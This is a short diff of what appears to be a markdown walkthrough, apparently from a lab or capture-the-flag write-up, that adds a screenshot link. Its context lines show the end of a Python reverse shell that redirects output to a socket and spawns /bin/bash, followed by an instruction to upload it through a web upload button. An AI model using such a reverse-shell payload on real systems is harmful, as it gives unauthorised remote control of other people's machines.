@@ -53,6 +53,9 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 
+<img width="476" height="165" alt="image" src="https://github.com/user-attachments/assets/4e2b2f45-6b03-4996-a552-34057528d24d" />
+
+
 Upload: IT VIA THAT UPLOAD BUTTON
 
 <img width="463" height="636" alt="image" src="https://github.com/user-attachments/assets/fb4793c6-99cb-4f35-a8b2-680db0cdb466" />
